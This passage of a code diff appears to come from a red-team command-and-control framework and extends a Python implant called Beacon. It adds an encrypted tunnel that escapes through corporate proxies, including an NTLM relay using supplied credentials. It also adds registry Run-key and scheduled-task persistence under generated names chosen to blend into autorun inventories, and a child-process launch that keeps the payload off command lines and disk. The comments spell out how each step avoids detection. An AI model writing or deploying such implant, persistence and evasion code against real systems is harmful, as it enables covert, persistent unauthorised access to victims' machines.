+                logger.warning("tunnel: a relay frame was malformed (%s); "
+                               "the session is over", exc)
+                return
+            try:
+                data = noise.decrypt(frame)
+            except ValueError as exc:
+                # Noise §5.1 again, on the relay this time.
+                logger.warning("tunnel: a relay frame did not authenticate "
+                               "(%s); the session is over", exc)
+                return
+            try:
+                peer.sendall(data)
+            except OSError:
+                return
+
+    # ── getting out ──
+
+    def _dial(self, port: int) -> socket.socket:
+        """One TCP stream to `self.server:port`, by the first way out.
+
+        A configured proxy, then whatever `ProxyDiscovery` finds, then
+        direct. The way that worked last is tried first, so a relay does
+        not re-walk the list; when that fails the whole list is walked
+        again, because what broke may be the proxy rather than the tunnel.
+        """
+        attempts = []
+        for route in self._routes():
+            try:
+                return self._dial_route(route, port)
+            except OSError as exc:
+                attempts.append("%s: %s" % (_route_name(route), exc))
+        raise OSError("no way out to %s:%d -- %s"
+                      % (self.server, port, "; ".join(attempts)))
+
+    def _routes(self) -> list:
+        """The ways out, in the order they are tried. `None` is direct."""
+        ordered = []
+        with self._lock:
+            if self._route_known:
+                ordered.append(self._route)
+        if self.proxy_mode != "none":
+            for route in self._configured_routes() + self._discovered_routes():
+                if route not in ordered:
+                    ordered.append(route)
+        if None not in ordered:
+            # Direct is always last and always tried: a proxy that has
+            # stopped answering must not take the tunnel with it.
+            ordered.append(None)
+        return ordered
+
+    def _configured_routes(self) -> list:
+        """The proxy this build was told to use, if it was told one."""
+        routes = []
+        relay = self._ntlm_route()
+        if relay is not None:
+            routes.append(relay)
+        endpoint = _proxy_endpoint(self.proxy_url)
+        if endpoint is not None:
+            routes.append(endpoint)
+        return routes
+
+    def _ntlm_route(self) -> Optional[Tuple[str, int]]:
+        """The local NTLM relay's address, starting it if it is configured.
+
+        `_NtlmProxyRelay` is a CONNECT proxy on loopback that performs the
+        NTLM handshake against the corporate one, so what this class does
+        with it is what it does with any proxy: dial it and write a
+        CONNECT. That indirection exists because the NTLM exchange has to
+        happen on the same TCP connection as the CONNECT it authorises,
+        which is not something a caller of this class could arrange.
+        """
+        cfg = self._proxy_ntlm
+        if not cfg.get("enabled"):
+            return None
+        with self._lock:
+            started = self._ntlm_relay
+        if started is not None:
+            return "127.0.0.1", started.port
+        host = str(cfg.get("host") or "").strip()
+        username = cfg.get("username") or ""
+        password = cfg.get("password") or ""
+        if not host or not username or not password:
+            logger.warning("tunnel: proxy NTLM is enabled but its host or "
+                           "credentials are missing; skipping the relay")
+            return None
+        try:
+            relay = _NtlmProxyRelay(
+                host, int(cfg.get("port") or 8080), username, password,
+                domain=cfg.get("domain", ""),
+                workstation=cfg.get("workstation", ""))
+            relay.start()
+        except (OSError, RuntimeError) as exc:
+            # A local port it could not bind, or no thread to serve it
+            # with. Either way the other ways out are still there.
+            logger.warning("tunnel: the NTLM proxy relay would not start "
+                           "(%s); falling back", exc)
+            return None
+        with self._lock:
+            if self._stop.is_set():
+                # `stop` ran while this relay was binding its port, and
+                # took `_ntlm_relay` with it. Installing it now would
+                # leave a bound loopback port and an accept thread that
+                # nothing is left to stop.
+                installed = None
+            elif self._ntlm_relay is None:
+                self._ntlm_relay = relay
+                installed = relay
+            else:
+                # Another thread won the race; one local port is enough.
+                installed = self._ntlm_relay
+        if installed is not relay:
+            relay.stop()
+        if installed is None:
+            return None
+        return "127.0.0.1", installed.port
+
+    def _discovered_routes(self) -> list:
+        """What `ProxyDiscovery` finds, run once per endpoint and cached.
+
+        Once, because discovery shells out, reads the registry and makes
+        two DNS lookups for WPAD, and a relay that re-ran all of that per
+        session would be slow and loud in equal measure. PAC and WPAD
+        entries are skipped: their URL is a script to fetch and evaluate,
+        not a proxy a CONNECT can be written to.
+        """
+        with self._lock:
+            cached = self._discovered
+        if cached is not None:
+            return cached
+        routes = []
+        try:
+            for proxy in ProxyDiscovery().discover_all():
+                if proxy.get("is_pac"):
+                    continue
+                endpoint = _proxy_endpoint(proxy.get("url"))
+                if endpoint is not None and endpoint not in routes:
+                    routes.append(endpoint)
+        except Exception as exc:
+            # Discovery runs `gsettings`, reads the Windows registry and
+            # resolves names. A host where one of those misbehaves still
+            # has a direct route to try.
+            logger.debug("tunnel: proxy discovery failed: %s", exc)
+        with self._lock:
+            self._discovered = routes
+        return routes
+
+    def _dial_route(self, route: Optional[Tuple[str, int]],
+                    port: int) -> socket.socket:
+        """One TCP stream by one way out, remembered if it works."""
+        if route is None:
+            sock = socket.create_connection((self.server, port),
+                                            timeout=self.connect_timeout)
+        else:
+            sock = socket.create_connection(route,
+                                            timeout=self.connect_timeout)
+            try:
+                self._write_connect(sock, port)
+            except OSError:
+                _shut_socket(sock)
+                raise
+        with self._lock:
+            self._route, self._route_known = route, True
+        return sock
+
+    def _write_connect(self, sock: socket.socket, port: int) -> None:
+        """`CONNECT <server>:<port>`, and the proxy's answer to it.
+
+        Written here rather than left to urllib because what follows on
+        this socket is Noise and not HTTP: urllib would own the stream.
+        The target is the tunnel server's single port, which is the whole
+        reason there is only one of them -- a second, unpredictable
+        destination port is what a default Squid configuration refuses.
+        """
+        target = "%s:%d" % (self.server, port)
+        sock.settimeout(self.connect_timeout)
+        sock.sendall(("CONNECT %s HTTP/1.1\r\nHost: %s\r\n"
+                      "Proxy-Connection: Keep-Alive\r\n\r\n"
+                      % (target, target)).encode("ascii"))
+        status = _proxy_read_line(sock)
+        for _ in range(_PROXY_MAX_HEADERS):
+            if not _proxy_read_line(sock):
+                break
+        fields = status.split(" ")
+        if len(fields) < 2 or fields[1] != "200":
+            # 407 lands here as well as 403: this class has no credentials
+            # of its own to offer, and the NTLM relay above is the path
+            # for a proxy that wants some.
+            raise OSError("the proxy answered %r to CONNECT %s"
+                          % (status, target))
+
+    # ── bookkeeping ──
+
+    def _handshake(self, sock: socket.socket, payload: bytes) -> NoiseSession:
+        """The initiator's two messages, with `payload` inside the first."""
+        sock.settimeout(self.connect_timeout)
+        noise = NoiseSession.initiator(self._public, self._psk)
+        write_frame(sock, noise.initiate(payload))
+        noise.complete(read_frame(sock))
+        return noise
+
+    def _egress(self) -> Optional[str]:
+        with self._lock:
+            if not self._route_known:
+                return None
+            return _route_name(self._route)
+
+    @staticmethod
+    def _crypto_path() -> str:
+        """Which AES backend this process has: `openssl` or `pure-python`.
+
+        Read through the module rather than copied at construction, so a
+        test that forces the slow backend sees it here too.
+        """
+        return "pure-python" if _USE_PURE_PYTHON_AES else "openssl"
+
+    def _register_socket(self, sock: socket.socket) -> None:
+        with self._lock:
+            self._relay_sockets.add(sock)
+
+    def _forget_socket(self, sock: socket.socket) -> None:
+        with self._lock:
+            self._relay_sockets.discard(sock)
+
+    def _count_session(self, delta: int) -> None:
+        with self._lock:
+            self._sessions += delta
+            if delta > 0:
+                self._carried += delta
+
+
 # ── Evasion pools ──
 
 _USER_AGENTS = [
@@ -1411,6 +3994,46 @@ def _decoy_fields(n: int) -> dict:
     return {k: pool[k]() for k in keys}
 
 
+# ── Persistence names ──
+#
+# One name per build, generated rather than fixed. The HKCU `Run` value
+# and the scheduled task used to be one literal written identically in
+# every deployment, so a single burned engagement burned the name for
+# every deployment that followed it.
+#
+# Ordinary administrative vocabulary on purpose: the only place this name
+# is ever read is an autorun inventory, where the thing that draws an eye
+# is a name that belongs to nothing. The trailing hex is what makes two
+# builds differ -- two words alone would collide across an engagement.
+_PERSIST_WORDS = ("Device", "Display", "Network", "Printer", "Credential",
+                  "Policy", "Session", "Storage", "Telemetry", "Update")
+_PERSIST_ROLES = ("Host", "Agent", "Broker", "Helper", "Manager", "Service",
+                  "Sync", "Worker")
+
+
+def persistence_name(entropy: bytes) -> str:
+    """One build's autorun entry name, derived from `entropy`.
+
+    Two callers, one shape. The generator passes `os.urandom`, so every
+    build it issues carries its own name in its config block. `Beacon`
+    passes bytes derived from its implant id when a config carries no
+    persistence block at all, because that answer has to be the same on
+    every run of one artifact on one host -- otherwise an `unpersist`
+    would go looking for a name no `persist` ever wrote.
+
+    Four bytes at least. A caller with fewer thought it was passing
+    something random and was not, and the name it would get back would be
+    the same one every other such caller got.
+    """
+    if len(entropy) < 4:
+        raise ValueError(
+            "persistence_name needs at least 4 bytes of entropy, got %d: "
+            "fewer than that is not a per-build name" % len(entropy))
+    return "%s%s%s" % (_PERSIST_WORDS[entropy[0] % len(_PERSIST_WORDS)],
+                       _PERSIST_ROLES[entropy[1] % len(_PERSIST_ROLES)],
+                       entropy[2:4].hex())
+
+
 class Beacon:
     """C2 beacon with AES-GCM encryption and network evasion."""
 
@@ -1458,6 +4081,55 @@ class Beacon:
         self._thread: Optional[threading.Thread] = None
         self._registered = False
         self._consecutive_failures = 0
+
+        # The tunnel endpoint runs in its own process, not a thread: the
+        # beacon is the access and the tunnel is the convenience, so a
+        # hung or crashed tunnel must not be able to take the beacon with
+        # it. One child at a time, and the record outlives the child so a
+        # check-in can confirm a stop and report a crash.
+        self._tunnel_proc: Optional[subprocess.Popen] = None
+        self._tunnel_origin = ""
+        # Retained so `tunnel start` can refuse before it spawns. The
+        # child's own refusal goes to a stderr this process sends to
+        # DEVNULL, so without this the operator's whole diagnosis is
+        # `exit_code: 1` at the next check-in.
+        self._tunnel_cfg = c2.get("tunnel")
+        # Why there is no block, when a config file had one this host
+        # could not use. `tunnel_mode_problem` cannot tell that case from
+        # a build generated without a tunnel, and its answer for the
+        # latter -- "generate the build with the tunnel enabled" -- is
+        # advice nobody can act on when the tunnel came from
+        # `configs/raccoon.yaml`. See `beacon_config_from_fallback`.
+        self._tunnel_problem = c2.get("tunnel_problem") or ""
+        # `_exec_tunnel` runs on the beacon thread and `stop` on whichever
+        # thread owns the process, so the two meet over this.
+        self._tunnel_lock = threading.Lock()
+
+        # Persistence: one generated name per build, carried in the config
+        # block, so `_exec_persist` and `_exec_unpersist` read one value
+        # rather than each holding its own copy of a literal. The name an
+        # install wrote is by construction the name a removal looks for.
+        persist_cfg = c2.get("persistence") or {}
+        # No block means a config file rather than a generated build.
+        # Derived from the implant id, which is stable for the life of a
+        # host, and not from a literal -- a literal here would be the
+        # thing this field exists to remove. The id is `_generate_id`'s
+        # hex digest, so its own bytes are the entropy: beacon.py's hash
+        # call sites are an allow-list in the hardening tests, on purpose,
+        # and a name needs no hash of its own.
+        self._persist_name = persist_cfg.get("name") or persistence_name(
+            bytes.fromhex(self._implant_id[:8]))
+        # `path` keeps the payload's path on the autorun command line;
+        # `argc` leaves it off and lets the hook in a brought
+        # interpreter's own `Lib/` find the payload. Anything else is a
+        # build from a newer generator than this artifact, and `path` is
+        # the answer that still works without a hook. See
+        # `render_sitecustomize` in `software/c2/stagers/startup_hook.py`
+        # for why `path` is the default rather than the quieter-looking
+        # one.
+        gate = persist_cfg.get("gate")
+        self._persist_gate = gate if gate in ("path", "argc") else "path"
+        self._persist_payload = persist_cfg.get("payload_name") or ""
 
         # A launcher that runs on the drop-box says so; the Raccoon config on
         # disk is the independent second signal (see _probe_dropbox).
@@ -1731,6 +4403,15 @@ class Beacon:
             info["proxy_active"] = self._proxy._active_proxy["url"]
         elif self._proxy_session and self._proxy_session.proxies:
             info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")
+
+        # Only when this beacon has started a tunnel child, so the check-in
+        # payload of every build that has no tunnel is byte for byte what
+        # it was. A child that has died is reported rather than forgotten:
+        # that is the only signal an operator gets for a tunnel that
+        # crashed, and it is what confirms a stop they asked for.
+        tunnel = self._tunnel_status()
+        if tunnel is not None:
+            info["tunnel"] = tunnel
 
         if self._c2_profile:
             p = self._c2_profile
@@ -3277,16 +5958,328 @@ class Beacon:
             i += 4
         return shares
 
+    # ── The tunnel child ──
+
+    def _tunnel_source(self) -> Tuple[bytes, str]:
+        """The source to hand a child, and where it was taken from.
+
+        A generated artifact carries its own source in the module global
+        `_src`, bound by each obfuscation layer as it decompresses the
+        next (`_obfuscate_layer` in server.py). That global is the only
+        copy there is: what this project ships is
+        `python3 -c '<blob>'`, where there is no file to re-run and
+        `sys.argv[0]` is the literal string "-c" -- which is also why
+        `_get_beacon_path` answers with something useless in exactly the
+        mode this runs in.
+
+        No `_src` means this file was run straight from a checkout rather
+        than built into an artifact, and then `__file__` is the source. A
+        developer in that position should not be debugging a missing
+        global, so it is a supported path and not an error.
+
+        The second return value says which it was, and `_exec_tunnel`
+        puts it in what it reports: "the tunnel is running a different
+        build from the beacon" is otherwise invisible, and it is the first
+        thing to suspect when a child connects and then behaves like
+        another version.
+        """
+        src = globals().get("_src")
+        if isinstance(src, str):
+            # A layer that bound text rather than bytes. Accepted because
+            # the alternative is refusing to start over an encoding.
+            src = src.encode("utf-8")
+        if isinstance(src, bytes) and src:
+            return src, "_src, this artifact's own source (%d bytes)" % len(src)
+        path = globals().get("__file__")
+        if not path:
+            raise RuntimeError(
+                "this process has neither the module global _src nor a "
+                "__file__, so there is no copy of the source to give a "
+                "child. A generated artifact has _src; a checkout has a "
+                "file.")
+        path = os.path.abspath(path)
+        data = Path(path).read_bytes()
+        return data, ("%s (no _src: this is a checkout and not a generated "
+                      "artifact, %d bytes)" % (path, len(data)))
+
+    def _tunnel_status(self) -> Optional[dict]:
+        """What this beacon's tunnel child is doing, or None if it had none.
+
+        `poll` is what reaps a child that has exited, so asking this on
+        every check-in is also what keeps a dead one from staying a
+        zombie.
+        """
+        with self._tunnel_lock:
+            proc = self._tunnel_proc
+            if proc is None:
+                return None
+            code = proc.poll()
+            row = {
+                "pid": proc.pid,
+                "running": code is None,
+                "source": self._tunnel_origin,
+            }
+            if code is not None:
+                row["exit_code"] = code
+            return row
+
+    def _exec_tunnel(self, action: str) -> str:
+        """Start or stop the tunnel endpoint as a child of this process."""
+        action = (action or "").strip().lower()
+        if action == "start":
+            return self._tunnel_start()
+        if action == "stop":
+            return self._tunnel_stop()
+        return ("[error] Unknown tunnel action %r: it is 'tunnel start' or "
+                "'tunnel stop'" % action)
+
+    def _tunnel_start(self) -> str:
+        """Run this artifact again as `python3 -`, in tunnel mode.
+
+        Four ways to start a second process of the same code exist and
+        three are worse. Re-running `python3 -c '<blob>'` writes the whole
+        payload into `ps` and `/proc/<pid>/cmdline`, where every user on
+        the host can read it and where a fleet running one build is
+        trivially enumerated. Writing the source to a file throws away
+        the in-memory property the one-liner exists for. `fork` does not
+        exist on Windows, where much of this design lives. `python3 -`
+        with the source on stdin is an unremarkable command line, leaves
+        nothing on disk, and is the same mechanism on both platforms.
+        """
+        with self._tunnel_lock:
+            proc = self._tunnel_proc
+            if proc is not None and proc.poll() is None:
+                return ("Tunnel already running: pid %d (one child per "
+                        "beacon; stop it before starting another)"
+                        % proc.pid)
+            # Refused here rather than by the child. The child's own
+            # bootstrap refuses too -- a build can be launched by hand or
+            # by a systemd unit with no parent -- but its stderr is
+            # DEVNULL, so a child is the one way the operator cannot be
+            # told why. The most likely case by far is a build generated
+            # before the generator learned to bake a tunnel block, and
+            # that currently reaches them as `exit_code: 1` and nothing
+            # else. Same predicate as the bootstrap's, wrapped in the
+            # config shape it reads.
+            #
+            # `_tunnel_problem` first, when there is one: the config file
+            # had a tunnel block and it was refused, so the predicate
+            # below would take its no-block arm and tell the operator to
+            # generate a build, which is not what is wrong and not
+            # something they can do about a YAML typo.
+            problem = (self._tunnel_problem
+                       or tunnel_mode_problem(
+                           {"c2": {"tunnel": self._tunnel_cfg}}))
+            if problem:
+                return "[error] Not starting a tunnel child: %s" % problem
+            try:
+                source, origin = self._tunnel_source()
+            except (OSError, RuntimeError) as exc:
+                return "[error] No source to give a tunnel child: %s" % exc
+
+            env = dict(os.environ)
+            env[_TUNNEL_MODE_ENV] = "1"
+            try:
+                child = subprocess.Popen(
+                    [sys.executable, "-"],
+                    stdin=subprocess.PIPE,
+                    # Both ends closed: a child that writes to the
+                    # terminal it was started from is how an implant is
+                    # noticed. What the endpoint could not do is reported
+                    # through its exit code at the next check-in, and the
+                    # tunnel server's own log is the other half.
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    env=env,
+                    close_fds=True,
+                )
+            except OSError as exc:
+                return ("[error] Could not start %s: %s"
+                        % (sys.executable, exc))
+
+            try:
+                # On a thread with a bounded join, not inline. `python -`
+                # reads stdin to EOF before it compiles anything, so this
+                # is milliseconds -- but the pipe holds only about 64 KB,
+                # and a child that reads nothing at all would park the
+                # beacon's own thread in `write` for ever. See
+                # `_TUNNEL_SOURCE_TIMEOUT`.
+                failure = self._feed_tunnel_child(child, source)
+            except RuntimeError as exc:
+                # The host is out of threads, which is the one way the
+                # feed can fail before it has begun. A child left running
+                # with no record of it is a process nothing can stop, so
+                # it goes the same way as one that read nothing.
+                failure = "its source could not be written: %s" % exc
+            if failure is not None:
+                child.kill()
+                return ("[error] The tunnel child was given no source and "
+                        "has been killed: %s (%s)"
+                        % (failure, self._child_ending(child)[1]))
+
+            self._tunnel_proc = child
+            self._tunnel_origin = origin
+            logger.info("Tunnel child started: pid %d, source from %s",
+                        child.pid, origin)
+            return ("Tunnel started: pid %d, %s - with the source on "
+                    "stdin, so none of it is on a command line. Source: %s"
+                    % (child.pid, sys.executable, origin))
+
+    @staticmethod
+    def _feed_tunnel_child(child, source: bytes) -> Optional[str]:
+        """Write the source to the child's stdin. Why it failed, or None.
+
+        The write is on a thread so the wait on it can be bounded: a
+        child that is not reading stdin would otherwise hold the caller
+        in `write` as soon as the pipe filled, and the caller is the
+        beacon's own loop.
+
+        Killing the child is left to the caller, and it is what ends this
+        thread when the bound is reached -- the parked `write` fails with
+        EPIPE the moment the reader is gone, so the thread is not leaked.
+        """
+        trouble = []
+
+        def feed():
+            try:
+                child.stdin.write(source)
+            except OSError as exc:
+                # A child that exited before it read -- a broken pipe --
+                # or a stdin already closed under us.
+                trouble.append("%s: %s" % (type(exc).__name__, exc))
+            finally:
+                try:
+                    # Closed on every path, including the one the caller
+                    # unparks by killing the child: a pipe left open is a
+                    # descriptor leak in a process meant to run for
+                    # months, and the EOF is what tells the interpreter
+                    # the script is complete.
+                    child.stdin.close()
+                except OSError:
+                    # The flush that `close` does finds the same broken
+                    # pipe the write did. The descriptor is closed either
+                    # way, which is what this is for.
+                    pass
+
+        writer = threading.Thread(target=feed, name="tunnel-feed",
+                                  daemon=True)
+        writer.start()
+        writer.join(_TUNNEL_SOURCE_TIMEOUT)
+        if writer.is_alive():
+            return ("it read none of the %d bytes on its stdin within "
+                    "%.0fs, so it is not an interpreter reading a script"
+                    % (len(source), _TUNNEL_SOURCE_TIMEOUT))
+        return trouble[0] if trouble else None
+
+    @staticmethod
+    def _child_ending(proc) -> Tuple[Optional[int], str]:
+        """Wait for a signalled child: its exit code, and how to say it.
+
+        Never raises, which is the point. `wait` raising
+        `subprocess.TimeoutExpired` out of `_tunnel_start` would reach
+        the operator as `[exception: ...]` from `_process_tasking`'s
+        catch-all with no child recorded, and out of `_tunnel_stop` it
+        would abort the rest of `Beacon.stop` before it had finished. A
+        child that has been killed and is still there is stuck in the
+        kernel and there is nothing further to try, so it is reported
+        rather than raised -- and the residue it leaves is named, because
+        "nothing is leaked" would not be true of it.
+        """
+        try:
+            code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
+        except subprocess.TimeoutExpired:
+            return None, ("pid %d has not gone within %.0fs, so it is stuck "
+                          "in the kernel and unreaped"
+                          % (proc.pid, _TUNNEL_CHILD_STOP_TIMEOUT))
+        return code, "exit %s" % code
+
+    def _tunnel_stop(self) -> str:
+        """Stop the tunnel child. The record of it outlives it.
+
+        Not cleared, because an operator's stop is pending until a
+        check-in confirms it: a beacon that forgot the child would report
+        nothing, which is indistinguishable from a stop that never
+        happened.
+
+        Both waits go through `_child_ending` and neither calls `wait`
+        itself. A `subprocess.TimeoutExpired` out of here would abort the
+        rest of `Beacon.stop` before it had finished, and reach an
+        operator as `[exception: ...]` from the tasking catch-all.
+        """
+        with self._tunnel_lock:
+            proc = self._tunnel_proc
+            if proc is None:
+                return ("No tunnel child is running: this beacon has not "
+                        "started one")
+            code = proc.poll()
+            if code is not None:
+                return ("No tunnel child is running: pid %d had already "
+                        "exited with %s" % (proc.pid, code))
+            proc.terminate()
+            code, ending = self._child_ending(proc)
+            if code is None:
+                # It did not go when asked.
+                proc.kill()
+                code, ending = self._child_ending(proc)
+                if code is None:
+                    logger.warning("Tunnel child pid %d survived a kill",
+                                   proc.pid)
+                    return ("[error] The tunnel child could not be stopped: "
+                            "it ignored a terminate and then a kill, and %s"
+                            % ending)
+                logger.warning("Tunnel child pid %d ignored a terminate and "
+                               "was killed", proc.pid)
+                return ("Tunnel stopped: pid %d ignored a terminate and was "
+                        "killed (%s)" % (proc.pid, ending))
+            logger.info("Tunnel child stopped: pid %d, exit %s", proc.pid, code)
+            return "Tunnel stopped: pid %d, exit %s" % (proc.pid, code)
+
     # ── Persistence ──
 
+    def _bundled_payload(self) -> str:
+        """This build's payload beside this interpreter, or "".
+
+        Non-empty means the interpreter running us is one we brought: the
+        stager lays the payload out next to it and the startup hook in
+        its own `Lib/` beside that. That is the only situation in which
+        the hook exists, so it is the only situation in which the `argc`
+        gate can be allowed to drop the payload's path from an autorun
+        command line.
+        """
+        if not self._persist_payload:
+            return ""
+        candidate = os.path.join(
+            os.path.dirname(os.path.abspath(sys.executable)),
+            self._persist_payload)
+        return candidate if os.path.isfile(candidate) else ""
+
     def _get_beacon_path(self) -> str:
+        """The payload path an autorun entry should name, or "" for none.
+
+        "" is a supported answer and means the entry needs no path: under
+        the `argc` gate, with a payload beside an interpreter we brought,
+        the hook in that interpreter's `Lib/` finds the payload itself and
+        the command line carries nothing to find.
+
+        Otherwise the bundled payload if there is one, and `sys.argv[0]`
+        if there is not -- which is the one thing this project ships as
+        `python3 -c '<blob>'`, where `sys.argv[0]` is the literal "-c"
+        and the answer is useless. A build that brought an interpreter is
+        exactly the build that can do better, so it does.
+        """
+        bundled = self._bundled_payload()
+        if bundled:
+            return "" if self._persist_gate == "argc" else bundled
         return os.path.abspath(sys.argv[0])
 
     def _exec_persist(self, method: str) -> str:
         method = (method or "auto").strip().lower()
         beacon_path = self._get_beacon_path()
         python_path = sys.executable
-        cmd_line = f"{python_path} {beacon_path}"
+        # No path to name: the startup hook is what finds the payload.
+        cmd_line = ("%s %s" % (python_path, beacon_path) if beacon_path
+                    else python_path)
+        name = self._persist_name
 
         if method == "auto":
             method = "registry" if platform.system() == "Windows" else "crontab"
@@ -3301,9 +6294,9 @@ class Beacon:
                     r"Software\Microsoft\Windows\CurrentVersion\Run",
                     0, winreg.KEY_SET_VALUE,
                 )
-                winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, cmd_line)
+                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, cmd_line)
                 winreg.CloseKey(key)
-                return f"Persistence installed: HKCU\\...\\Run\\SystemHealthMonitor\n{cmd_line}"
+                return f"Persistence installed: HKCU\\...\\Run\\{name}\n{cmd_line}"
 
             elif method == "startup":
                 if platform.system() != "Windows":
@@ -3320,12 +6313,12 @@ class Beacon:
                 if platform.system() != "Windows":
                     return "[error] Scheduled task persistence only available on Windows"
                 result = subprocess.run(
-                    ["schtasks", "/create", "/tn", "SystemHealthMonitor",
+                    ["schtasks", "/create", "/tn", name,
                      "/tr", cmd_line, "/sc", "onlogon", "/rl", "highest", "/f"],
                     capture_output=True, text=True, timeout=15,
                 )
                 if result.returncode == 0:
-                    return f"Persistence installed: schtask SystemHealthMonitor\n{result.stdout.strip()}"
+                    return f"Persistence installed: schtask {name}\n{result.stdout.strip()}"
                 return f"[error] {result.stderr.strip()}"
 
             elif method == "crontab":
@@ -3384,6 +6377,8 @@ class Beacon:
 
     def _exec_unpersist(self, method: str) -> str:
         method = (method or "auto").strip().lower()
+        # The same value `_exec_persist` wrote, read from the same place.
+        name = self._persist_name
         if method == "auto":
             method = "registry" if platform.system() == "Windows" else "crontab"
 
@@ -3396,7 +6391,7 @@ class Beacon:
                     0, winreg.KEY_SET_VALUE,
                 )
                 try:
-                    winreg.DeleteValue(key, "SystemHealthMonitor")
+                    winreg.DeleteValue(key, name)
                 except FileNotFoundError:
                     return "No registry persistence found"
                 finally:
@@ -3413,7 +6408,7 @@ class Beacon:
 
             elif method == "schtask":
                 result = subprocess.run(
-                    ["schtasks", "/delete", "/tn", "SystemHealthMonitor", "/f"],
+                    ["schtasks", "/delete", "/tn", name, "/f"],
                     capture_output=True, text=True, timeout=15,
                 )
                 return result.stdout.strip() or result.stderr.strip() or "Scheduled task removed"
@@ -4288,6 +7283,9 @@ class Beacon:
             elif cmd == "smbloot":
                 output = self._exec_smbloot(args)
 
+            elif cmd == "tunnel":
+                output = self._exec_tunnel(args)
+
             else:
                 status = "error"
                 output = f"Unknown command: {cmd}"
@@ -4488,4 +7486,11 @@ class Beacon:
         if self._ntlm_relay:
             self._ntlm_relay.stop()
             self._ntlm_relay = None
+        # The beacon is the only way to task the tunnel, so a tunnel that
+        # outlived it would be a process nothing could reach and nothing
+        # could stop. The record is left in place: see `_tunnel_stop`.
+        if self._tunnel_proc is not None and self._tunnel_proc.poll() is None:
+            logger.info("Beacon stopping: taking tunnel child pid %d with it",
+                        self._tunnel_proc.pid)
+            self._tunnel_stop()
         logger.info("Beacon stopped")
